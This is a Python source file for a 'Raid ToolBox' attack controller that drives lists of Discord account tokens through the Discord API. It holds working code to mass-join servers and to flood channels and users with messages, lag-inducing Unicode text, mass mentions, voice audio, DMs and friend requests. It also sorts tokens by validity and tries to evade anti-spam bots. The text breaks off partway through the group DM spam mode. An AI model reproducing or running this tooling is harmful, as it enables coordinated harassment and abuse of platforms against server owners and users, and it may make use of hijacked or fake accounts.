#!/usr/bin/env python3
# Raid ToolBox Attack Controller
# Author: DeadBread76 - https://github.com/DeadBread76/
# July 3rd, 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os, sys, ast, json, time, random, base64, subprocess, requests, shutil, uuid
from itertools import cycle
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
mode = sys.argv[1]
pycommand = sys.argv[2]
climode = int(sys.argv[3])
threadcount = sys.argv[4]
theme = ast.literal_eval(sys.argv[5])
with open('./config.json', 'r') as handle:
    config = json.load(handle)
    token_list = config['token_list']
if not climode == 1:
    if not sys.platform.startswith('darwin'):
        import PySimpleGUI as sg
    else:
        import PySimpleGUIQt as sg
    if theme['use_custom_theme']:
        sg.SetOptions(background_color=theme['background_color'],
                     text_element_background_color=theme['text_element_background_color'],
                     element_background_color=theme['element_background_color'],
                     scrollbar_color=theme['scrollbar_color'],
                     input_elements_background_color=theme['input_elements_background_color'],
                     input_text_color=theme['input_text_color'],
                     button_color=theme['button_colour'],
                     text_color=theme['text_color'])
    else:
        sg.ChangeLookAndFeel(theme['preset_theme'])
executor = ThreadPoolExecutor(max_workers=int(threadcount))
tokenlist = open("tokens/"+token_list).read().splitlines()
true = 'true'
false = 'false'

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

if mode == 'joiner':
    successfully = []
    def join(token,link,widget):
        global successfully
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if widget:
            src = requests.get("https://canary.discordapp.com/api/guilds/{}/widget.json".format(str(link)))
            widgson = json.loads(src.content)
            try:
                link = widgson['instant_invite'][37:]
            except Exception:
                sys.exit()
            src = requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
            if src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            successfully.append(token)
        else:
            src = requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
            if src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            successfully.append(token)
    if climode == 0:
        layout = [
                [sg.Text('Enter Invite to join.'), sg.InputText(size=(42,1)),sg.RButton('Join',button_color=theme['button_colour'],size=(10,1))],
                [sg.Text('Delay'), sg.Combo(['0','1','3','5','10','60']), sg.Checkbox('Log Info', tooltip='Log Info of server to text file.',size=(8,1)), sg.Checkbox('Widget joiner (Requires Server ID)'), sg.Text('Tokens:', size=(6,1)),sg.Input(len(tokenlist),size=(3,1),tooltip="Number of tokens to join.")],
                ]
        window = sg.Window('RTB | Joiner', layout, keep_on_top=True)
        event, values = window.Read()
        print(values)
        window.Close()
        link = values[0]
        delay = values[1]
        log = values[2]
        widget = values[3]
        limit = int(values[4])
        if event == "Join":
            pass
        else:
            sys.exit()
    else:
        link = sys.argv[6]
        log = False
        widget = False
        delay = "0"
        limit = len(tokenlist)
    if widget:
        pass
    else:
        if 'https://discordapp.com/invite/' in link:
            link = link[30:]
        elif len(link) > 7:
            link = link[19:]
    count = 0
    if not delay == '0':
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            count += 1
            if count == limit:
                break
            time.sleep(int(delay))
    else:
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            count += 1
            if count == limit:
                break
    if log:
        executor.shutdown(wait=True)
        try:
            s = requests.get("https://canary.discordapp.com/api/v6/invite/{}".format(link)).text
            serjson = json.loads(s)
            with open("JoinerLogs.txt", "a+", errors='ignore') as handle:
                handle.write("=======================\n{}\n=======================\nInvite Code: {}\nServer name: {}\nServer ID: {}\nInvite channel ID: {}\nInvite Channel Name: {}\nVerification Level: {}\n\n".format(str(datetime.now()),serjson['code'],serjson['guild']['name'],serjson['guild']['id'],serjson['channel']['id'],serjson['channel']['name'],serjson['guild']['verification_level']))
            layout = [[sg.Text('Server Name: {}'.format(serjson['guild']['name']))],
                    [sg.Text('Server ID: {}'.format(serjson['guild']['id']))],
                    [sg.Text('Tokens Joined Successfully: {}'.format(len(successfully)))],
                    [sg.Button('kthxbye',button_color=theme['button_colour'],size=(15,1)), sg.Button('Export Tokens',button_color=theme['button_colour'],size=(15,1))]
                    ]
            window = sg.Window('RTB | Joiner Results', layout, keep_on_top=True)
            event, values = window.Read()
            window.Close()
            if event == "Export Tokens":
                with open ("working_tokens_exported.txt","a+") as handle:
                    for token in successfully:
                        handle.write("{}\n".format(token))
                sg.PopupOK('Exported {} tokens to working_tokens_exported.txt'.format(len(successfully)),title="RTB")
        except Exception:
            pass

elif mode == 'leaver':
    def leave(token,ID):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/users/@me/guilds/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]]
        window = sg.Window('RTB | Leaver', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[6]
    for token in tokenlist:
        executor.submit(leave,token,ID)

elif mode == 'groupleaver':
    def grleave(token,ID):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/channels/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]]
        window = sg.Window('RTB | Group DM Leaver', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[6]
    for token in tokenlist:
        executor.submit(grleave,token,ID)

elif mode == "Checker":
    verifiedtokens = []
    unverifiedtokens = []
    invalidtokens = []
    if len(tokenlist) > 100:
        choice = sg.PopupYesNo("You Have Over 100 tokens. I'd Recommend using Checker V2 for this many\nas you could get CloudFlare banned.\nContinue?")
        if choice == "Yes":
            pass
        else:
            sys.exit()
    sg.PopupTimed("Checking Tokens...", title="DeadBread's Raid Toolbox | Checker", non_blocking=True)
    def check(token):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.post('https://canary.discordapp.com/api/v6/invite/{}'.format(random.randint(1,9999999)), headers=headers)
        if "You need to verify your account in order to perform this action." in str(src.content):
            unverifiedtokens.append(token)
        elif "401: Unauthorized" in str(src.content):
            invalidtokens.append(token)
        else:
            if token in verifiedtokens:
                pass
            else:
                verifiedtokens.append(token)
    for token in tokenlist:
        executor.submit(check, token)
    executor.shutdown(wait=True)
    vlist = ''
    ulist = ''
    for token in verifiedtokens:
        vlist += token + "\n"
    for token in unverifiedtokens:
        ulist += token + "\n"
    layout = [
             [sg.Text('Verified Tokens ({}):'.format(len(verifiedtokens)),size=(59,1)), sg.Text('Unverified Tokens ({}):'.format(len(unverifiedtokens)))],
             [sg.Multiline(vlist, size=(66,20)), sg.Multiline(ulist, size=(66,20))],
             [sg.RButton('Save Verified',button_color=theme['button_colour'],size=(10,1)), sg.RButton('Save Both',button_color=theme['button_colour'],size=(10,1))]
             ]
    window = sg.Window('RTB | Checker | [{} Verified] [{} Unverified] [{} Invalid]'.format(len(verifiedtokens),len(unverifiedtokens),len(invalidtokens)), layout, keep_on_top=True)
    event, values = window.Read()
    if event == "Save Verified":
        if not os.path.isdir("tokens/old"):
            os.mkdir("tokens/old")
        shutil.copyfile("tokens/"+token_list, "tokens/old/{}old{}.txt".format(token_list.replace(".txt",""),random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens/"+token_list,"w+") as handle:
            handle.write(vlist)
            sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
    elif event == "Save Both":
        if not os.path.isdir("tokens/old"):
            os.mkdir("tokens/old")
        shutil.copyfile("tokens/"+token_list, "tokens/old/{}old{}.txt".format(token_list.replace(".txt",""),random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens/"+token_list,"w+") as handle:
            handle.write(vlist)
            handle.write(ulist)
            sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
    window.Close()

elif mode == "Checker V2":
    verifiedtokens = []
    unverifiedtokens = []
    invalidtokens = []
    sg.PopupTimed("Checking Tokens...", title="DeadBread's Raid Toolbox | Checker V2", non_blocking=True)
    def checkv2(token):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        if "401: Unauthorized" in str(src.content):
            invalidtokens.append(token)
        else:
            response = json.loads(src.content.decode())
            if response["verified"]:
                verifiedtokens.append(token)
            else:
                unverifiedtokens.append(token)
    for token in tokenlist:
        executor.submit(checkv2, token)
    executor.shutdown(wait=True)
    vlist = ''
    ulist = ''
    for token in verifiedtokens:
        vlist += token + "\n"
    for token in unverifiedtokens:
        ulist += token + "\n"
    layout = [
             [sg.Text('Verified Tokens ({}):'.format(len(verifiedtokens)),size=(59,1)), sg.Text('Unverified Tokens ({}):'.format(len(unverifiedtokens)))],
             [sg.Multiline(vlist, size=(66,20)), sg.Multiline(ulist, size=(66,20))],
             [sg.RButton('Save Verified',button_color=theme['button_colour'],size=(10,1)), sg.RButton('Save Both',button_color=theme['button_colour'],size=(10,1))]
             ]
    window = sg.Window('RTB | Checker V2 | [{} Verified] [{} Unverified] [{} Invalid]'.format(len(verifiedtokens),len(unverifiedtokens),len(invalidtokens)), layout, keep_on_top=True)
    event, values = window.Read()
    if event == "Save Verified":
        if not os.path.isdir("tokens/old"):
            os.mkdir("tokens/old")
        shutil.copyfile("tokens/"+token_list, "tokens/old/{}old{}.txt".format(token_list.replace(".txt",""),random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens/"+token_list,"w+") as handle:
            handle.write(vlist)
            sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
    elif event == "Save Both":
        if not os.path.isdir("tokens/old"):
            os.mkdir("tokens/old")
        shutil.copyfile("tokens/"+token_list, "tokens/old/{}old{}.txt".format(token_list.replace(".txt",""),random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens/"+token_list,"w+") as handle:
            handle.write(vlist)
            handle.write(ulist)
            sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
    window.Close()


elif mode == 'messagespam':
    def sendmessage(token,text,channel,server,emojispam,antispambypass):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if emojispam:
            text += " "
            src = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/emojis".format(server), headers=headers)
            for emoji in json.loads(src.content):
                if emoji['animated'] == True:
                    pass
                else:
                    text += "<:{}:{}>".format(emoji['name'],emoji['id'])
            if channel == 'all':
                chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
                channellist = json.loads(chanjson)
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": false}
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                                if src.status_code == 429:
                                    ratelimit = json.loads(src.content)
                                    time.sleep(float(ratelimit['retry_after']/1000))
                                elif src.status_code == 401:
                                    error = json.loads(src.content)
                                    with open('errors.log', 'a') as errorlogging:
                                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                    sys.exit()
                                elif src.status_code == 404:
                                    error = json.loads(src.content)
                                    with open('errors.log', 'a') as errorlogging:
                                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                    sys.exit()

            else:
                headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": false}
                    for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            if channel == 'all':
                chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
                channellist = json.loads(chanjson)
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": false}
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()

            else:
                headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
                original = text
                while True:
                    text = original
                    if antispambypass:
                        text += " " + str(random.randint(1000,9999))
                    payload = {"content": text, "tts": false}
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1)),sg.Checkbox("Append Emoji Spam",tooltip="Add Emoji Spam to message, message can be empty."), sg.Checkbox("Anti-Spam Bypass",tooltip="Attempts to bypass anti-spam bots")]
             ]
        window = sg.Window('RTB | Message Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        channelid = values[1]
        SERVER = values[2]
        emojispam = values[3]
        bypass = values[4]
    else:
        text = sys.argv[6]
        channelid = sys.argv[7]
        SERVER = sys.argv[8]
        emojispam = False
        bypass = False
    for token in tokenlist:
        executor.submit(sendmessage,token,text,channelid,SERVER,emojispam,bypass)

elif mode == 'asciispam':
    def sendascii(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": asciigen(1999), "tts": false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            while True:
                payload = {"content": asciigen(1999), "tts": false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
    if climode == 0:
        layout = [[sg.Text('WARNING: This will make your Discord client lag by just looking at the channel,\nI recommend not looking at the channels while doing this attack.')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Ascii Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendascii,token,channelid,SERVER)

elif mode == 'massmention':
    def sendmention(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        memberlist = []
        msg = ''
        memb = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/members?limit=1000".format(server),headers=headers).text
        memberjson = json.loads(memb)
        for member in memberjson:
            memberlist.append("<@{}>".format(member['user']['id']))
        for member in memberlist:
            msg += member + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                                requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
              ]
        window = sg.Window('RTB | Mass Mentioner', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[6]
        channelid = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendmention,token,channelid,SERVER)

elif mode == 'vcspam':
    import youtube_dl
    ydl_opts = {
        'outtmpl': 'RTBFiles/vcspammercache/file.webm',
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'wav',
            'preferredquality': '192',
        }],
    }
    if climode == 0:
        layout = [
              [sg.Text('YouTube Link to play', size=(15, 1)), sg.InputText()],
              [sg.Text('Voice Channel ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)),
              default_value=len(tokenlist),
              size=(29,15),
              orientation='horizontal',
              font=('Helvetica', 10),text_color=(theme['slider_text_color']))],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
              ]
        window = sg.Window('RTB | Voice Chat Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        ytlink = values[0]
        channelid = values[1]
        ammount = values[2]
    else:
        ytlink = sys.argv[6]
        channelid = sys.argv[7]
        ammount = sys.argv[8]
    if not os.path.isdir('RTBFiles/vcspammercache/'):
        os.mkdir("RTBFiles/vcspammercache/")
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        info_dict = ydl.extract_info(ytlink, download=False)
        video_id = info_dict.get("id", None)
    if not os.path.isfile('RTBFiles/vcspammercache/{}.wav'.format(video_id)):
        ydl_opts = {
         'outtmpl': 'RTBFiles/vcspammercache/{}.webm'.format(video_id),
         'format': 'bestaudio/best',
         'postprocessors': [{
             'key': 'FFmpegExtractAudio',
             'preferredcodec': 'wav',
             'preferredquality': '192',
         }],
        }
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            ydl.download([ytlink])
    count = 0
    for token in tokenlist:
        count += 1
        subprocess.Popen([pycommand,'RTBFiles/vcspam.py',token,channelid,'RTBFiles/vcspammercache/{}.wav'.format(video_id),str(os.getpid())],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        if count == int(ammount):
            break
    while True:
        pass

elif mode == 'dmspammer':
    def dmspammer(token,userid,text,ascii):
        list = []
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {
            'recipient_id': userid
        }
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
        userdm = src.content.decode()
        jsonstring = json.loads(userdm).values()
        for x in jsonstring:
            list.append(x)
        userdm = list[2]
        if ascii == True:
            payload = {"content": asciigen(1999), "tts": false}
        else:
            payload = {"content": text, "tts": false}
        while True:
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(userdm), headers=headers, json=payload)
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after']/1000))
            elif src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
    if climode == 0:
        layout = [
            [sg.Text('Note: The tokens need to share a mutual server with the target for this to work.')],
            [sg.Text('Users ID', size=(15, 1)), sg.InputText()],
            [sg.Text('Text to spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
            ]
        window = sg.Window('RTB | DM Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
        text = values[1]
        ascii = values[2]
    else:
        userid = sys.argv[6]
        text = sys.argv[7]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(dmspammer,token,userid,text,ascii)

elif mode == 'friender':
    def friend(token,userid):
        if "#" in userid:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            user = userid.split("#")
            payload = {"username": user[0], "discriminator": user[1]}
            requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload)
        else:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            requests.put('https://canary.discordapp.com/api/v6/users/@me/relationships/{}'.format(str(userid)), headers=headers)
    if climode == 0:
        layout = [
              [sg.Text('Enter A User ID or Name + Tag')],
              [sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Friend Bomber', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
    else:
        userid = sys.argv[6]
    for token in tokenlist:
        executor.submit(friend,token,userid)

elif mode == 'groupdmspam':
    def sendgdm(token,text,group,ascii):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content": text, "tts": false}
        while True:
            if ascii:
